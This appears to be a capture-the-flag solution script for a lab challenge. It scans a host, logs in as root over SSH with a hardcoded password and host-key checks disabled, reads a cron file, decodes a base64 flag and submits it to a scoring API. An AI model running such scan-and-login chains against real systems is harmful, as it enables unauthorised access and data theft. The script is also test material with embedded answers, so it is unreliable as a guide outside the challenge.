#!/bin/sh
set -eu

host=172.20.0.141
user=root
password='NeonHarbor!4086'
challenge_id=scl-challenge-frame-4086a9

nmap -Pn -p 22 "$host" >/dev/null
schedule=$(sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$user@$host" 'cat /etc/cron.d/sysstat-maintenance')
encoded=$(printf '%s\n' "$schedule" | python3 -c 'import re,sys; s=sys.stdin.read(); m=re.search(r"batch=([A-Za-z0-9+/=]+)", s); assert m, "encoded batch value not found"; print(m.group(1))')
flag=$(printf '%s' "$encoded" | python3 -c 'import base64,sys; print(base64.b64decode(sys.stdin.read()).decode())')
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "{\"challenge_id\":\"$challenge_id\",\"task_id\":\"task1\",\"flag\":\"$flag\"}"
